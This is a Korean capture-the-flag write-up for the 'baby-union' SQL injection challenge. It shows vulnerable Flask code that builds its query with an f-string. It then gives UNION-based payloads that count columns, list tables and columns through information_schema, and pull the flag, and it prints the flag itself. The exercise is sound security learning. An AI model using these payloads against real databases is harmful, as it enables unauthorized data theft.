# S4 · baby-union

### 1. VM에 접속한다

문제 페이지에는 `uid`, `upw` 로그인 입력창과 현재 실행될 SQL 쿼리가 보인다.

<img width="1917" height="475" alt="image" src="https://github.com/user-attachments/assets/9fed5037-ddba-414c-a645-314fa4c3d0ce" />


### 2. 코드 분석 — SQL Injection 발생 원인

문제의 Flask 코드에서 사용자 입력값을 SQL 문자열에 직접 삽입한다.

```python
uid = request.form.get('uid', '')
upw = request.form.get('upw', '')
if uid and upw:
    cur = mysql.connection.cursor()
    cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
    data = cur.fetchall()
    if data:
        return render_template("user.html", data=data)
```

- `f"...{uid}...{upw}..."` : 입력값이 SQL 구문으로 해석될 수 있어 SQL Injection이 발생한다.
- `if uid and upw` : 두 입력창에 값이 모두 있어야 쿼리를 실행하므로, `upw`에도 임의의 값을 입력한다.
- `fetchall()` : 조회한 여러 행을 가져와 화면에 전달한다.

### 3. ORDER BY로 컬럼 개수 확인

`UNION SELECT`를 사용하려면 기존 `SELECT * FROM users`와 컬럼 개수를 맞춰야 한다. `uid`에 다음처럼 입력하면서 확인했다. (`upw`는 `1234`)

```sql
' ORDER BY 1 #
' ORDER BY 2 #
' ORDER BY 3 #
' ORDER BY 4 #
```


`ORDER BY n`은 n개 행을 가져오는 것이 아니라 **n번째 컬럼을 기준으로 정렬**한다. 확인 결과 `users` 조회 결과는 **4개 컬럼**이었다.


<img width="603" height="442" alt="image" src="https://github.com/user-attachments/assets/f4b12a9b-ba32-4351-8d79-3a7d0981783b" />

<img width="1027" height="224" alt="image" src="https://github.com/user-attachments/assets/1e425526-8fad-4ea9-964e-f354010900b7" />



### 4. UNION으로 테이블 목록 조회

**uid 입력값**

```sql
' UNION SELECT table_name,NULL,NULL,NULL
FROM information_schema.tables
WHERE table_schema=DATABASE() #
```

**upw 입력값**: `1234`(아무거나 입력해도 상관없음.)



- `UNION SELECT` : 기존 조회 결과에 다른 조회 결과를 합친다.
- `table_name` : 테이블 이름을 조회한다.
- `information_schema.tables` : MySQL이 제공하는 테이블 구조 정보이다.
- `WHERE table_schema=DATABASE()` : **현재 사용 중인 데이터베이스**에 속한 테이블만 조회한다.
- `NULL,NULL,NULL` : 기존 쿼리와 컬럼 개수를 4개로 맞춘다.
- `#` : 뒤에 남는 비밀번호 검사 구문을 주석 처리한다.

**조회 결과**

<img width="745" height="260" alt="image" src="https://github.com/user-attachments/assets/1a6758eb-ab0d-4832-9d57-4ed0bdb87d57" />


### 5. onlyflag 테이블의 컬럼 이름 확인

`onlyflag` 테이블을 찾았으므로 `information_schema.columns`에서 컬럼 이름을 조회한다.

```sql
' UNION SELECT column_name,NULL,NULL,NULL
FROM information_schema.columns
WHERE table_schema=DATABASE() AND table_name='onlyflag' #
```

**조회 결과**

<img width="696" height="502" alt="image" src="https://github.com/user-attachments/assets/5515cc81-3c0d-48f5-a04b-12b07fb0a0f8" />




### 6. FLAG 확인

이제 `onlyflag` 테이블의 컬럼을 조회할 수 있다. 예를 들어 `sflag` 컬럼의 내용을 첫 번째 출력 위치로 가져오는 UNION 구문은 다음과 같다.

```sql
' UNION SELECT sflag,NULL,NULL,NULL FROM onlyflag #
```

svalue

```sql
' UNION SELECT svalue,NULL,NULL,NULL FROM onlyflag #
```

sclose

```sql
' UNION SELECT svalue,NULL,NULL,NULL FROM onlyflag #
```

<img width="850" height="209" alt="image" src="https://github.com/user-attachments/assets/fab9cc1c-0d05-4e96-817a-d9fd946e8fc6" />

<img width="891" height="214" alt="image" src="https://github.com/user-attachments/assets/08d9d9fe-0a93-481b-a165-ed58bec80fce" />

<img width="883" height="363" alt="image" src="https://github.com/user-attachments/assets/3d1b5e42-a0e7-477e-bc12-40fe731a9afd" />

**확인한 FLAG**

```text
DH{57033624d7f142f57f139b4c9e84bd78da77b4406896c386672f0cbb016f5873}
```

**취약점 원인:** 문자열 포매팅으로 사용자 입력을 SQL에 직접 삽입하여 UNION SQL Injection이 가능했고, 이를 통해 `information_schema`에서 테이블과 컬럼 구조를 조회할 수 있었다.
